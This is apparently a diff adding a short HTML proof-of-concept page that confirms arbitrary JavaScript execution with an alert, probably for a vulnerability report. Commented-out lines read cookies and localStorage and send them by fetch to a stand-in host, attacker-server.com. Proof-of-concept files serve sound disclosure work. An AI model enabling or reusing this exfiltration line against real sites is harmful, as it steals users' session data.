@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+</head>
+<body>
+    <h1>Arbitrary JavaScript Execution</h1>
+    <script>
+        // 1. Verify Execution
+        alert("Vulnerability Confirmed: JavaScript is executing!");
+        
+        // 2. Demonstrate Data Access (Example)
+        // If the app sets cookies or uses localStorage for this domain, we can steal them.
+        // var cookies = document.cookie;
+        // var localStorageContent = localStorage.getItem('someKey');
+        
+        // 3. Send data to attacker (Simulated)
+        // fetch('https://attacker-server.com/steal?data=' + encodeURIComponent(cookies));
+        
+        console.log("Attacker script loaded successfully.");
+    </script>
+    <p>If you see this alert, the vulnerability exists.</p>
+</body>
+</html>
